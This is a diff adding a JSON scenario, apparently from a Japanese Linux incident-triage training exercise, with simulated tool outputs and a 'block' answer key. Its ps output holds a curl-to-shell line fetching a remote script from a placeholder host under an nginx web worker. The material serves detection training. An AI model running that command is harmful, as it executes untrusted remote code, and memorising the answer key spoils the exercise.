@@ -1,0 +1,188 @@
+{
+  "schema_version": 2,
+  "id": "PROC-LINUX-WEB-SHELL-COMMAND",
+  "category": "process",
+  "platform": "linux",
+  "title": "Webワーカーからの外部取得",
+  "request": "稼働中のプロセスを継続させますか。 ALLOW / BLOCKで判断してください。",
+  "required_evidence": [
+    "ps",
+    "pstree",
+    "service"
+  ],
+  "ground_truth": "block",
+  "explanation": "Webワーカー配下のシェルが外部スクリプトを取得・実行するコマンドを動かしており、静的サイトの承認構成に反するため停止します。シェル名だけではなく親子関係とコマンドを根拠にします。",
+  "initial": {
+    "information": [
+      {
+        "id": "Process",
+        "label": "Process",
+        "value": "sh",
+        "data_type": "text"
+      },
+      {
+        "id": "PID",
+        "label": "PID",
+        "value": 4200,
+        "data_type": "pid"
+      },
+      {
+        "id": "User",
+        "label": "User",
+        "value": "www-data",
+        "data_type": "username"
+      },
+      {
+        "id": "採取時点",
+        "label": "採取時点",
+        "value": "2026-08-18 09:10 / 起動済み",
+        "data_type": "text"
+      }
+    ],
+    "terms": [
+      "process",
+      "pid",
+      "user"
+    ]
+  },
+  "resources": [
+    {
+      "id": "ps",
+      "name": "ps",
+      "description": "選択PIDのユーザー・親PID・コマンドラインを確認します。",
+      "accepted_information_types": [
+        "pid"
+      ],
+      "input_bindings": [
+        {
+          "source": "initial_information",
+          "id": "PID"
+        }
+      ],
+      "input_hint": "PID",
+      "platform_note": "Linux / procps-ng",
+      "environments": [
+        "linux"
+      ],
+      "kind": "tools",
+      "result": {
+        "content": "Commandの抜粋\nUSER PID PPID ELAPSED COMMAND\nwww-data 4200 3100 00:10 /bin/sh -c \"curl https://worker-assets.example/a.sh | /bin/sh 〔引数を省略〕\"",
+        "terms": [
+          "pid",
+          "user",
+          "command",
+          "extension",
+          "path",
+          "script",
+          "shell",
+          "url",
+          "elapsed",
+          "training_placeholder",
+          "iwr_curl",
+          "http",
+          "url_path"
+        ]
+      },
+      "terms": [
+        "pid",
+        "user",
+        "parent",
+        "command",
+        "tool_ps"
+      ]
+    },
+    {
+      "id": "pstree",
+      "name": "pstree",
+      "description": "選択PIDの祖先プロセスの連鎖を確認します。",
+      "accepted_information_types": [
+        "pid"
+      ],
+      "input_bindings": [
+        {
+          "source": "initial_information",
+          "id": "PID"
+        }
+      ],
+      "input_hint": "PID",
+      "platform_note": "Linux / psmisc",
+      "environments": [
+        "linux"
+      ],
+      "kind": "tools",
+      "result": {
+        "content": "systemd(1)---nginx(900)---web-worker(3100)---sh(4200)\n表示: 選択PIDの祖先Chain",
+        "terms": [
+          "pid",
+          "parent",
+          "shell",
+          "service"
+        ]
+      },
+      "terms": [
+        "process",
+        "pid",
+        "parent",
+        "tool_pstree"
+      ]
+    },
+    {
+      "id": "systemctl",
+      "name": "systemctl",
+      "description": "選択PIDの所属ユニット・状態・構成を表示します。",
+      "accepted_information_types": [
+        "pid"
+      ],
+      "input_bindings": [
+        {
+          "source": "initial_information",
+          "id": "PID"
+        }
+      ],
+      "input_hint": "PID",
+      "platform_note": "Linux / systemd",
+      "environments": [
+        "linux"
+      ],
+      "kind": "tools",
+      "result": {
+        "content": "PID 4200 の所属Unit: nginx.service\nControlGroup: /system.slice/nginx.service\nUnitのActiveState: active\n選択PIDはMainPIDではなく子Process。",
+        "terms": [
+          "process",
+          "pid",
+          "parent",
+          "service",
+          "unit_fields",
+          "cgroup"
+        ]
+      },
+      "terms": [
+        "pid",
+        "tool_systemctl"
+      ]
+    },
+    {
+      "id": "service",
+      "name": "サービス構成台帳",
+      "kind": "references",
+      "result": {
+        "content": "web-workerは静的コンテンツの配信のみ。外部スクリプトの取得・起動は禁止。保守は運用ユーザーの専用ジョブで実施。",
+        "terms": [
+          "user",
+          "script",
+          "static_analysis",
+          "job"
+        ]
+      },
+      "terms": [
+        "service"
+      ]
+    }
+  ],
+  "learning_objectives": [
+    "親子関係・コマンドとサービスの責務を比較する"
+  ],
+  "sources": [
+    "https://www.freedesktop.org/software/systemd/man/latest/systemctl.html"
+  ]
+}
